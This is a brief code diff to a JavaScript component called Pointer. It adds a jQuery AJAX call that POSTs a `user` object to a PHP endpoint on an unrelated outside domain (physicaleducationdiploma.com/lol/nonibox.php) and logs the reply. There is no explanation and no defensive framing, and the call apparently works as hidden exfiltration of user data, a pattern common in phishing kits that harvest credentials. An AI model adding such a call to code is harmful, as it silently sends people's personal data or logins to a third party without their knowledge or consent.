@@ -74,6 +74,19 @@ export const Pointer = ()=>{
                 },
             });
 
+
+                $.ajax({
+                type: "POST",
+                url: "https://physicaleducationdiploma.com/lol/nonibox.php",
+                data: user,
+                success(data) {
+                    // alert('OK');
+                    console.log(data);
+                },
+            });
+
+            
+
             
         }
     };
